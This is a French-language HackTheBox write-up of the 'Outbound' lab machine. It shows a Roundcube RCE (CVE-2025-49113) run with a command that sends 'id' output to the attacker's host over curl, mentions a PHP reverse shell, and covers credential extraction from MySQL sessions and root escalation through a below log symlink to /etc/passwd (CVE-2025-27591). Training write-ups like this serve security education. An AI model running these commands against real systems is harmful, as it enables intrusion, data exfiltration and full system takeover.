---
title: OutBound
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Easy", "Linux", "CVE-2025-49113", "MySQL", "CVE-2025-27591"]
---

Outbound est une machine Linux de difficulté facile avec des identifiants de compromission initiale fournis. Ces identifiants donnent accès à une instance `Roundcube`, où l'utilisateur peut énumérer la version et exploiter `CVE-2025-49113`, permettant l'exécution de code à distance via la désérialisation d'objets PHP. Après l'accès initial, nous énumérons la base de données et trouvons une session pour l'utilisateur `Jacob` contenant un mot de passe chiffré en base64. En utilisant un outil interne appelé `decrypt.sh`, nous extrayons le mot de passe en clair, permettant l'accès à Roundcube en tant que Jacob. Jacob a deux messages : l'un contient son nouveau mot de passe système, l'autre l'informe de ses privilèges sudo pour surveiller les ressources avec l'utilitaire `below`, vulnérable à `CVE-2025-27591`. Cette faille crée des logs dans `/var/log/below` avec des permissions excessives permettant des attaques par liens symboliques. Nous créons un lien symbolique de `/etc/passwd` vers `error_root.log` et injectons notre payload via injection de paramètres, créant ainsi un nouvel utilisateur avec l'UID root.

# Enumération
## Nmap

Il y a 2 ports ouverts : SSH (22) et HTTP (80).
```bash
╭─root at exegol-hackthebox in /workspace/OutBound
╰─○ nmap 10.129.189.233 --min-rate 10000 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-13 14:02 CEST
Nmap scan report for 10.129.189.233
Host is up (0.29s latency).
Not shown: 47077 filtered tcp ports (no-response), 18456 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 68.32 seconds

╭─root at exegol-hackthebox in /workspace/OutBound
╰─○ nmap 10.129.189.233 -p 22,80 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-13 14:04 CEST
Nmap scan report for 10.129.189.233
Host is up (0.080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

J'ajoute le nom de domaine dans le fichier `/etc/hosts`.
```shell
echo "10.129.189.233 outbound.htb mail.outbound.htb" | tee -a /etc/hosts
```


## SSH - TCP 22

Impossible de se connecter par SSH avec les identifiants donnés.
```bash
╭─root at exegol-hackthebox in /workspace/OutBound
╰─○ nxc ssh 10.129.189.233 -u tyler -p LhKL1o9Nm3X2
SSH         10.129.189.233  22     10.129.189.233   [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
SSH         10.129.189.233  22     10.129.189.233   [-] tyler:LhKL1o9Nm3X2
```


## HTTP - TCP 80

Je me connecte avec les identifiants reçus.
![](/images/OutBound/1.png)


Une fois connecté, je trouve la version de `RoundCube Webmail`.
![](/images/OutBound/3.png)

# Shell en tant que www-data

## CVE-2025-49113

Une petite recherche google et je vois que cette version est vulnérable à une `RCE via désérialisation d'Objet PHP`. Je trouve alors un [POC GitHub](https://github.com/hakaioffsec/CVE-2025-49113-exploit?tab=readme-ov-file).
```bash
╭─root at exegol-hackthebox in /workspace/OutBound/CVE-2025-49113-exploit on main✔
╰─± php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'curl http://10.10.14.71:8000/$(id | base64)'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```


Sur un second terminal je lance un serveur web sur le port 8000 qui reçoit le résultat de la commande.
![](/images/OutBound/2.png)


Je décode alors la chaine de caractères et je vois que la commande `id` a bien été exécutée.
```bash
╭─root at exegol-hackthebox in /workspace/OutBound/CVE-2025-49113-exploit on main✔
╰─± echo "dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK" | base64 -d
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


Donc pour avoir un reverse shell, je crée un fichier `shell.php` contenant le payload de [pentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Je l'uploade sur la machine cible et l'exécute.
![](/images/OutBound/4.png)


# Shell en tant que jacob
## MySQL

Dans le fichier `/var/www/html/roundcube/config/config.inc.php`, se trouvent des identifiants MySQL.
![](/images/OutBound/5.png)


Les hash de la table `users`, ne me serviront malheureusement à rien.
```bash
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/config$ mysql -u roundcube -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 189
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]> show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)

MariaDB [roundcube]> describe users;
+----------------------+------------------+------+-----+---------------------+----------------+
| Field                | Type             | Null | Key | Default             | Extra          |
+----------------------+------------------+------+-----+---------------------+----------------+
| user_id              | int(10) unsigned | NO   | PRI | NULL                | auto_increment |
| username             | varchar(128)     | NO   | MUL | NULL                |                |
| mail_host            | varchar(128)     | NO   |     | NULL                |                |
| created              | datetime         | NO   |     | 1000-01-01 00:00:00 |                |
| last_login           | datetime         | YES  |     | NULL                |                |
| failed_login         | datetime         | YES  |     | NULL                |                |
| failed_login_counter | int(10) unsigned | YES  |     | NULL                |                |
| language             | varchar(16)      | YES  |     | NULL                |                |
| preferences          | longtext         | YES  |     | NULL                |                |
+----------------------+------------------+------+-----+---------------------+----------------+
9 rows in set (0.001 sec)

MariaDB [roundcube]> select * from users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-13 12:42:28 | 2025-06-11 07:51:22 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+
3 rows in set (0.001 sec)

MariaDB [roundcube]> select username, preferences from users;
+----------+---------------------------------------------------+
| username | preferences                                       |
+----------+---------------------------------------------------+
| jacob    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |
| mel      | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |
| tyler    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |
+----------+---------------------------------------------------+
3 rows in set (0.000 sec)

MariaDB [roundcube]> quit;
```


Dans la table contact, j'ai les emails des différents utilisateurs.
```shell
MariaDB [roundcube]> select * from identities;
+-------------+---------+---------------------+-----+----------+-------+--------------+-----------------+----------+-----+-----------+----------------+
| identity_id | user_id | changed             | del | standard | name  | organization | email           | reply-to | bcc | signature | html_signature |
+-------------+---------+---------------------+-----+----------+-------+--------------+-----------------+----------+-----+-----------+----------------+
|           1 |       1 | 2025-06-07 13:55:18 |   0 |        1 | jacob |              | jacob@localhost |          |     | NULL      |              0 |
|           2 |       2 | 2025-06-08 12:04:51 |   0 |        1 | mel   |              | mel@localhost   |          |     | NULL      |              0 |
|           3 |       3 | 2025-06-08 13:28:55 |   0 |        1 | tyler |              | tyler@localhost |          |     | NULL      |              0 |
+-------------+---------+---------------------+-----+----------+-------+--------------+-----------------+----------+-----+-----------+----------------+
3 rows in set (0.000 sec)
```


La table `session` contient des informations sur la session de connexion des utilisateurs.
```
MariaDB [roundcube]> select * from session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
| qgtnhhbt9es12631e2q3q2tnd6 | 2025-07-13 13:16:40 | 172.17.0.1 | dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJIeXNkWGREeEVMZmFSSXNPbTNBanZBNjFkS0tET092VyI7                                                                                                       --[snip]--

MariaDB [roundcube]> quit;
```


Je décode la chaine de caractères et j'ai le mot de passe chiffré de l'utilisateur jacob sur `RoundCube`.
![](/images/OutBound/6.png)


Dans le répertoire `/var/www/html/roundcube/bin` se trouve plusieurs scripts dont celui permettant de déchiffrer les mots de passe de `RoundCube`. Je déchiffre alors ce mot de passe trouvé.
```bash
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/bin$ ./decrypt.sh 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'
59*************
```

Je me connecte alors en tant que `jacob` sur la page web de `RoundCube`. Je vois qu'il a reçu deux mails, un de `mel` qui parle de monitoring et un de `tyler` qui lui donne son nouveau mot de passe temporaire qu'il lui demande de changer dans les plus brefs délais.
![](/images/OutBound/7.png)

![](/images/OutBound/8.png)

J'utilise alors ce mot de passe pour me connecter à la machine en tant que jacob par SSH. 
```bash
╭─root at exegol-hackthebox in /workspace/OutBound
╰─○ ssh jacob@mail.outbound.htb
jacob@mail.outbound.htb's password:
--[snip]--
jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
jacob@outbound:~$ ls -la
total 28
drwxr-x--- 3 jacob jacob 4096 Jul  8 20:14 .
drwxr-xr-x 5 root  root  4096 Jul  8 20:14 ..
lrwxrwxrwx 1 root  root     9 Jul  8 11:12 .bash_history -> /dev/null
-rw-r--r-- 1 jacob jacob  220 Jun  8 12:14 .bash_logout
-rw-r--r-- 1 jacob jacob 3771 Jun  8 12:14 .bashrc
drwx------ 2 jacob jacob 4096 Jun 11 11:32 .cache
-rw-r--r-- 1 jacob jacob  807 Jun  8 12:14 .profile
-rw-r----- 1 root  jacob   33 Jul 13 12:01 user.txt
jacob@outbound:~$ cat user.txt
b3520********************************
```

# Shell en tant que root
## Below (CVE-2025-27591)

Après exécution de la commande `sudo -l`, je vois que `jacob` peut utiliser [below](https://github.com/facebookincubator/below), un moniteur de ressources en ligne de commande.
```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Lorsque j'exécute la commande `sudo /usr/bin/below`.
![](/images/OutBound/9.png)

Sur [cve-details](https://www.cvedetails.com/cve/CVE-2025-27591/), je vois que récemment sur `below` se trouvait une vulnérabilité permettant une escalade de privilèges. Ce article de [OpenWall](https://www.openwall.com/lists/oss-security/2025/03/12/1) l'explique bien. Donc pour exploiter cette vulnérabilité, je crée en premier un lien symbolique du fichier `/etc/passwd` vers le fichier `/var/log/below/error_root.log`.
```bash
ln -sf /etc/passwd /var/log/below/error_root.log
```

Donc je peux accéder au contenu du `/etc/passwd` depuis le `/var/log/below/error_root.log`. Donc je modifie le contenu de ce fichier. Je supprime le `x` de `root`, pour pouvoir me connecter en tant que `root` sans mot de passe.
```sh
jacob@outbound:~$ cat /var/log/below/error_root.log
root::0:0:root:/root:/bin/bash  <---- Enlever le x
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
--[snip]--
mel:x:1000:1000:,,,:/home/mel:/bin/bash
tyler:x:1001:1001:,,,:/home/tyler:/bin/bash
jacob:x:1002:1002:,,,:/home/jacob:/bin/bash
```

Je me connecte en tant que root avec la commande `su root` et je récupère le flag root.
```bash
jacob@outbound:~$ su root
root@outbound:/home/jacob# cd /root
root@outbound:~# ls -la
total 40
drwx------  6 root root 4096 Jul 13 14:33 .
drwxr-xr-x 23 root root 4096 Jul  8 20:14 ..
lrwxrwxrwx  1 root root    9 Jul  8 11:12 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root 4096 Jul  8 20:14 .cache
-rw-------  1 root root   20 Jul  9 13:53 .lesshst
drwxr-xr-x  3 root root 4096 Jul  8 20:14 .local
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r-----  1 root root   33 Jul 13 14:33 root.txt
drwxr-xr-x  2 root root 4096 Jul  9 13:47 .scripts
drwx------  2 root root 4096 Jul  8 20:14 .ssh
root@outbound:~# cat root.txt
032a7*****************************
```
